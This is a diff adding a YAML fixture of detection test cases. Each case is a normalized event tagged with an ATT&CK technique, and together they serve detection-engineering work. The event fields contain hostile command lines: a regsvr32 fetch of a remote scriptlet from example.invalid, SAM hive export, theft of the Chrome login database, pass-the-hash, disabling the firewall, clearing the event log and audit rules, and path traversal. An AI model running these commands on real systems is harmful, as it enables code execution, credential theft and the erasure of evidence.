@@ -1,0 +1,514 @@
+name: 检测证据补充
+# 规则与边界见 docs/detection-evidence.md；按规则 ID 的正反例对拍在 exact-rule-cases.json。
+cases:
+  - name: "lnx_signal_group_db/T1098"
+    technique: T1098
+    source: 本地构造的归一化事件
+    class: 1001
+    os: linux
+    expect: signal
+    event:
+      activity_id: 3
+      file:
+        path: /etc/gshadow
+
+  - name: "用户 crontab 变更（SigmaHQ New Cron File Created）"
+    technique: T1053.003
+    source: 本地构造的归一化事件
+    class: 1001
+    os: linux
+    event:
+      activity_id: 3
+      file:
+        path: /var/spool/cron/crontabs/root
+
+  - name: "lnx_signal_init_scripts/T1037.004"
+    technique: T1037.004
+    source: 本地构造的归一化事件
+    class: 1001
+    os: linux
+    expect: signal
+    event:
+      activity_id: 3
+      file:
+        path: /etc/rc.local
+
+  - name: "lnx_signal_systemd_timer/T1053.006"
+    technique: T1053.006
+    source: 本地构造的归一化事件
+    class: 1001
+    os: linux
+    expect: signal
+    event:
+      activity_id: 3
+      file:
+        path: /etc/systemd/system/update.timer
+
+  - name: "lnx_signal_systemd_override/T1543.002"
+    technique: T1543.002
+    source: 本地构造的归一化事件
+    class: 1001
+    os: linux
+    expect: signal
+    event:
+      activity_id: 3
+      file:
+        path: /etc/systemd/system/sshd.service.d/override.conf
+
+  - name: "lnx_signal_audit_config/T1562.012"
+    technique: T1562.012
+    source: 本地构造的归一化事件
+    class: 1001
+    os: linux
+    expect: signal
+    event:
+      activity_id: 3
+      file:
+        path: /etc/audit/rules.d/security.rules
+
+  - name: "win_winrm_exec/T1021.006"
+    technique: T1021.006
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        file:
+          path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        cmd_line: powershell Invoke-Command -ComputerName server01 -ScriptBlock {whoami}
+        name: powershell.exe
+
+  - name: "win_regsvr32_scriptlet/T1218.010"
+    technique: T1218.010
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        file:
+          path: C:\Windows\System32\regsvr32.exe
+        cmd_line: regsvr32 /s /n /u /i:https://example.invalid/payload.sct scrobj.dll
+        name: regsvr32.exe
+
+  - name: "win_rundll32_script/T1218.011"
+    technique: T1218.011
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        file:
+          path: C:\Windows\System32\rundll32.exe
+        cmd_line: rundll32 javascript:"..\mshtml,RunHTMLApplication";document.write()
+        name: rundll32.exe
+
+  - name: "win_script_userdir/T1059.005"
+    technique: T1059.005
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        file:
+          path: C:\Windows\System32\wscript.exe
+        cmd_line: wscript.exe C:\Users\test\Downloads\invoice.vbs
+        name: wscript.exe
+
+  - name: "win_script_userdir/T1059.007"
+    technique: T1059.007
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        file:
+          path: C:\Windows\System32\wscript.exe
+        cmd_line: wscript.exe C:\Users\test\Downloads\invoice.vbs
+        name: wscript.exe
+
+  - name: "win_sam_export/T1003.002"
+    technique: T1003.002
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        file:
+          path: C:\Windows\System32\reg.exe
+        cmd_line: reg.exe save HKLM\SAM C:\Temp\sam.hiv
+        name: reg.exe
+
+  - name: "win_browser_credential_copy/T1555.003"
+    technique: T1555.003
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        file:
+          path: C:\Windows\System32\cmd.exe
+        cmd_line: cmd /c copy "C:\Users\test\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\Temp\logins.db
+        name: cmd.exe
+
+  - name: "win_firewall_disable/T1562.004"
+    technique: T1562.004
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        file:
+          path: C:\Windows\System32\netsh.exe
+        cmd_line: netsh advfirewall set allprofiles state off
+        name: netsh.exe
+
+  - name: "win_wevtutil_clear/T1070.001"
+    technique: T1070.001
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        file:
+          path: C:\Windows\System32\wevtutil.exe
+        cmd_line: wevtutil cl Security
+        name: wevtutil.exe
+
+  - name: "win_pth_command/T1550.002"
+    technique: T1550.002
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        file:
+          path: C:\Tools\test.exe
+        cmd_line: test.exe "sekurlsa::pth /user:lab /domain:LAB /ntlm:00000000000000000000000000000000"
+        name: test.exe
+
+  - name: "win_fodhelper_shell/T1548.002"
+    technique: T1548.002
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        file:
+          path: C:\Windows\System32\cmd.exe
+        cmd_line: cmd.exe /c whoami
+        name: cmd.exe
+        parent_process:
+          file:
+            path: C:\Windows\System32\fodhelper.exe
+
+  - name: "win_admin_share_copy/T1570"
+    technique: T1570
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        file:
+          path: C:\Windows\System32\cmd.exe
+        cmd_line: cmd /c copy C:\package.exe \\server01\ADMIN$\package.exe
+        name: cmd.exe
+
+  - name: "win_admin_share_copy/T1021.002"
+    technique: T1021.002
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        file:
+          path: C:\Windows\System32\cmd.exe
+        cmd_line: cmd /c copy C:\package.exe \\server01\ADMIN$\package.exe
+        name: cmd.exe
+
+  - name: "win_ad_discovery/T1087.002"
+    technique: T1087.002
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      activity_id: 1
+      process:
+        file:
+          path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        cmd_line: powershell Get-ADUser -Filter *
+        name: powershell.exe
+
+  - name: "win_signal_login_success/T1078"
+    technique: T1078
+    source: 本地构造的归一化事件
+    class: 3002
+    os: windows
+    expect: signal
+    event:
+      activity_id: 1
+      status_id: 1
+      event_id: 4624
+      service:
+        name: logon-type-3
+      user:
+        name: gap-test-user
+      src_endpoint:
+        ip: 192.0.2.10
+
+  - name: "win_signal_rdp_success/T1021.001"
+    technique: T1021.001
+    source: 本地构造的归一化事件
+    class: 3002
+    os: windows
+    expect: signal
+    event:
+      activity_id: 1
+      status_id: 1
+      event_id: 4624
+      service:
+        name: logon-type-10
+      user:
+        name: gap-test-user
+      src_endpoint:
+        ip: 192.0.2.10
+
+  - name: "app_signal_postgres_auth_failure/T1110.001"
+    technique: T1110.001
+    source: 本地构造的归一化事件
+    class: 100001
+    os: linux
+    expect: signal
+    event:
+      metadata:
+        product:
+          name: postgres
+      message: 'FATAL: password authentication failed for user "test"'
+      activity_id: 1
+
+  - name: "app_signal_mysql_auth_failure/T1110.001"
+    technique: T1110.001
+    source: 本地构造的归一化事件
+    class: 100001
+    os: linux
+    expect: signal
+    event:
+      metadata:
+        product:
+          name: mysqld
+      message: 'Access denied for user ''test''@''192.0.2.10'' (using password: YES)'
+      activity_id: 1
+
+  - name: "app_web_path_traversal/T1190"
+    technique: T1190
+    source: 本地构造的归一化事件
+    class: 100001
+    os: linux
+    event:
+      metadata:
+        product:
+          name: nginx
+      message: 192.0.2.10 - - "GET /../../etc/passwd HTTP/1.1" 400 0
+      activity_id: 1
+
+  - name: "lnx_signal_systemd_unit_deleted/0"
+    technique: T1070
+    source: 本地构造的归一化事件
+    class: 1001
+    os: linux
+    expect: signal
+    event:
+      activity_id: 4
+      file:
+        path: /etc/systemd/system/demo.service
+
+  - name: "lnx_signal_systemd_unit_deleted/1"
+    technique: T1070
+    source: 本地构造的归一化事件
+    class: 1001
+    os: linux
+    expect: signal
+    event:
+      activity_id: 4
+      file:
+        path: /usr/lib/systemd/system/demo.service
+
+  - name: "lnx_signal_account_create/0"
+    technique: T1136.001
+    source: 本地构造的归一化事件
+    class: 1007
+    os: linux
+    expect: signal
+    event:
+      process:
+        file:
+          path: /usr/sbin/useradd
+        cmd_line: useradd -m lab-user
+
+  - name: "lnx_signal_account_create/1"
+    technique: T1136.001
+    source: 本地构造的归一化事件
+    class: 1007
+    os: linux
+    expect: signal
+    event:
+      process:
+        file:
+          path: /usr/sbin/adduser
+        cmd_line: adduser --disabled-password lab-user
+
+  - name: "win_powershell_screen_capture/0"
+    technique: T1113
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      process:
+        name: powershell.exe
+        cmd_line: $graphics.CopyFromScreen(0,0,0,0,$size)
+
+  - name: "win_powershell_screen_capture/1"
+    technique: T1113
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      process:
+        name: powershell.exe
+        cmd_line: $g.cOpYfRoMsCrEeN (0,0,0,0,$s)
+
+  - name: "win_office_verclsid/0"
+    technique: T1218.012
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      process:
+        file:
+          path: C:\Windows\System32\verclsid.exe
+        parent_process:
+          file:
+            path: C:\Program Files\Office\WINWORD.EXE
+
+  - name: "win_office_verclsid/1"
+    technique: T1218.012
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      process:
+        file:
+          path: C:\Windows\SysWOW64\verclsid.exe
+        parent_process:
+          file:
+            path: C:\Office\EXCEL.EXE
+
+  - name: "win_sysmon_remote_thread/0"
+    technique: T1055
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      sysmon:
+        event_id: 8
+        provider: Microsoft-Windows-Sysmon
+        source_image: C:\temp\sample.exe
+        target_image: C:\Windows\System32\svchost.exe
+
+  - name: "win_sysmon_lsass_access/0"
+    technique: T1003.001
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      sysmon:
+        event_id: 10
+        provider: Microsoft-Windows-Sysmon
+        source_image: C:\temp\sample.exe
+        target_image: C:\Windows\System32\lsass.exe
+        granted_access: '0x1010'
+
+  - name: "win_sysmon_lsass_access/1"
+    technique: T1003.001
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      sysmon:
+        event_id: 10
+        provider: Microsoft-Windows-Sysmon
+        source_image: C:\a.exe
+        target_image: C:\Windows\System32\LSASS.EXE
+        granted_access: '0x001FFFFF'
+
+  - name: "win_sysmon_image_replaced/0"
+    technique: T1055.012
+    source: 本地构造的归一化事件
+    class: 1007
+    os: windows
+    event:
+      sysmon:
+        event_id: 25
+        provider: Microsoft-Windows-Sysmon
+        image: C:\Windows\System32\svchost.exe
+        tamper_type: Image is replaced
+
+  - name: "win_signal_ntlm_network_logon/0"
+    technique: T1078
+    source: 本地构造的归一化事件
+    class: 3002
+    os: windows
+    expect: signal
+    event:
+      event_id: 4624
+      log_name: Security
+      status_id: 1
+      service:
+        name: logon-type-3
+      user:
+        name: alice
+      src_endpoint:
+        ip: 10.0.0.7
+      authentication_package: NTLM
+      logon_process: NtLmSsp
+      workstation_name: WS01
+
+  - name: "auditd CONFIG_CHANGE remove_rule（已知缺口）"
+    technique: T1562.012
+    source: 本地构造的归一化事件
+    class: 100001
+    os: linux
+    expect: undetected
+    event:
+      metadata:
+        product:
+          name: auditd
+      audit:
+        type: CONFIG_CHANGE
+        op: remove_rule
+        res: '1'
+        auid: '1000'
+
+  - name: "auditctl -D 清空审计规则（SigmaHQ Audit Rules Deleted Via Auditctl）"
+    technique: T1685.004
+    source: 本地构造的归一化事件
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: auditctl
+        file:
+          path: /usr/sbin/auditctl
+        cmd_line: auditctl -D
